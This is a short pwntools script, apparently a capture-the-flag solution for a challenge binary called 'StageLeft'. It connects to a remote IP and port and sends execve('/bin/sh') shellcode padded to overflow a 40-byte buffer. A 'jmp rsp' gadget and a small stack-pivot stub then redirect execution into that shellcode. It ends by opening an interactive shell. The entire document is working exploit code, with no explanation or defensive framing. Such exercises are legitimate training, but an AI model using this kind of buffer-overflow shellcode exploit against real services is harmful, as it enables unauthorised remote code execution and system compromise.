from pwn import *
context.terminal = ["tmux", "splitw", "-h"] # Open tmux terminal before executing script
LOCAL = False

if LOCAL:
    p = gdb.debug("./StageLeft","""
                break *0x4011ad
                continue
                """, aslr=False)
else:
    p = remote("3.91.151.73", 9001)

e = ELF("StageLeft", False)
r = ROP(e)

context.arch = "amd64"
context.os = "linux"
context.bits = "64"
shell_code = asm(
    '''
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    mov rax, 0x3b
    syscall
    '''
)
jmp_rsp = p64(0x401238) # ROPgadget --binary StageLeft --only jmp
sub_rsp_jmp_rsp = asm('sub rsp, 48; jmp rsp')

p.recvuntil(b"Cramped...")
p.send(shell_code + b"A" * (40 - len(shell_code)) + jmp_rsp + sub_rsp_jmp_rsp + b"\n")

p.interactive()